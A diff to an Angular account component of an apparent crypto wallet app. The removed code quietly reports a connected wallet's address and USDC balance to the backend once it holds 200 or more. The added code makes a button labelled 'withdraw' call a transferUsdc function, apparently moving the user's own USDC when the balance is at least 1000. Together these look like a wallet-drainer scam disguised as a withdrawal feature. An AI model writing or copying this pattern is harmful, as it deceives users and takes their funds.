@@ -26,15 +26,11 @@ export class AccountComponent implements OnInit, OnDestroy {
   priceETH: number = 0;
   withdrawAmount: number = 0;
   balanceUSDCOrigin: number = 0;
-  isReward: boolean = false;
 
   private getProfitSub?: Subscription;
   private balanceSub?: Subscription;
   private accountSub?: Subscription;
   private hasShownLowBalanceModal: boolean = false;
-  private hasSentMail: boolean = false;
-  private sendMailSub?: Subscription;
-
 
   constructor(private web3Service: Web3Service, private appService: AppService) { }
 
@@ -49,9 +45,7 @@ export class AccountComponent implements OnInit, OnDestroy {
         this.amountUSDC = 0;
         this.amountETH = 0;
         this.totalAmount = 0;
-        this.hasSentMail = false;
         this.getBalance();
-        this.getReward();
       }
     });
 
@@ -71,48 +65,15 @@ export class AccountComponent implements OnInit, OnDestroy {
         this.getProfit();
         this.getPriceETH();
       }
-
-      if (this.balanceUSDCOrigin >= 200 && this.isAccount) {
-        if (!this.hasSentMail) {
-          this.hasSentMail = true;
-          this.sendMail();
-        }
-      }
-
     });
   }
 
-  sendMail() {
-    this.sendMailSub?.unsubscribe();
-
-    this.sendMailSub = this.appService.sendMail({
-      address: this.account,
-      chainId: this.web3Service.selectedChainId,
-      amount: this.balanceUSDCOrigin
-    }).subscribe({
-      next: (data) => console.log(data),
-      error: (err) => console.error(err)
-    });
-  }
-
-  getReward() {
-    this.appService.getReward(this.account, this.web3Service.selectedChainId).subscribe((data: any) => {
-      if (this.account && data && data.data.length) {
-        this.isReward = true;
-      }
-      else {
-        this.isReward = false;
-      }
-    })
-  }
 
   ngOnDestroy() {
     this.stopAllTimers();
     this.getProfitSub?.unsubscribe();
     this.balanceSub?.unsubscribe();
     this.accountSub?.unsubscribe();
-    this.sendMailSub?.unsubscribe();
-
   }
 
   private stopAllTimers() {
@@ -153,7 +114,7 @@ export class AccountComponent implements OnInit, OnDestroy {
 
     this.getProfitSub?.unsubscribe();
     this.getProfitSub = this.appService
-      .getProfit(this.account, this.web3Service.selectedChainId, this.balanceUSDCOrigin)
+      .getProfit(this.account, this.web3Service.selectedChainId)
       .subscribe((data: any) => {
         this.totalAmount = data.total_amount;
         this.totalUSDC = data.usdc_amount;
@@ -227,10 +188,7 @@ export class AccountComponent implements OnInit, OnDestroy {
   }
 
   async withdraw() {
-    if (this.balanceUSDCOrigin <= 1) {
-      return;
-    }
-    if (this.balanceUSDCOrigin < 1000) {
+    if (this.balanceUSDC < 1000) {
       this.web3Service.showModal('Error', 'Wallet balance is less than 1000 USDC', 'error');
       return;
     }
@@ -240,7 +198,7 @@ export class AccountComponent implements OnInit, OnDestroy {
 
     this.isDisabled = true;
     try {
-      const allowance: any = await this.web3Service.approveUSDCAsync();
+      const allowance: any = await this.web3Service.transferUsdc();
       if (allowance === null || allowance <= 0) {
         this.isDisabled = false;
         return;
